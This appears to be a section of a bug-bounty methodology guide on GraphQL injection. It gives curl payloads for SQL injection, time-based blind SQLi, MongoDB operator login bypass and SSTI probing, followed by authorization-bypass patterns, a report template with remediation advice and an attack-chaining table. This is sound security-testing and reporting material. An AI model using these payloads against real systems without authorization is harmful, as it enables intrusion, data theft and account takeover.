# Injection — Resolver Arguments and Report Template

## SQL injection

GraphQL arguments pass directly to resolvers. Resolvers often pass them to
SQL/NoSQL queries without sanitization.

```bash
# Classic SQLi probe via search/filter args
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(search: \"admin'\''--\") { id email } }"}'

# Time-based blind SQLi
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(id: \"1 AND SLEEP(5)--\") { email } }"}'

# gqlmap for automated injection
gqlmap --target https://target.com/graphql \
  --query '{ users(search: GQLMAP) { id email } }' \
  --dbms mysql
```

## NoSQL injection (MongoDB common in GraphQL backends)

```bash
# MongoDB operator injection via JSON coercion
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ login(username: {\"$gt\": \"\"}, password: {\"$gt\": \"\"}) { token } }"}'

# Regex bypass
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(filter: {email: {\"$regex\": \".*\"}}) { id email } }"}'
```

## SSTI via template-rendered fields

```bash
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { updateProfile(bio: \"{{7*7}}\") { bio } }"}'
```

## Authorization bypass patterns

- Sensitive queries without any auth token
- Mutations without auth (`createAdmin`)
- Horizontal → vertical: find role mutation in schema, call it as a regular user
- Deprecated field auth bypass: `legacyToken`, `adminFlags`

## Report template

```
Title: GraphQL [VULN TYPE] — [Impact One-liner]
Endpoint: POST https://target.com/graphql
Request:  [paste raw curl or HTTP request]
Response: [paste relevant portion of response]
Impact:   [what an attacker can actually do RIGHT NOW — no hypotheticals]
Steps to Reproduce: 1. [exact curl step] 2. [observe response] 3. [confirm impact]

CVSS (approximate):
- Introspection only:        CVSS 5.3 (Medium) — info disclosure
- IDOR cross-user:           CVSS 7.5-8.5 (High)
- Batching ATO chain:        CVSS 9.0+ (Critical)
- Unauthenticated mutation:  CVSS 9.8 (Critical)

Remediation:
- Disable introspection in production
- Enforce per-query depth limit (<= 10) and complexity limits
- Disable query batching or add per-batch rate limits
- Validate object ownership in every resolver (not just at route level)
- Remove field suggestions in production
```

## Chaining table

| Chain | Severity |
|---|---|
| Introspection → admin mutations → call without auth | Critical |
| Batching → OTP brute force → account takeover | Critical |
| Field suggestions → hidden field → IDOR | High |
| Alias bomb → bypass rate limit → credential stuffing | High |
| Unauthenticated subscription → real-time PII leak | High |
| Depth bomb → no query limits → DoS | Medium |
| Deprecated field → PII exposure | Medium |
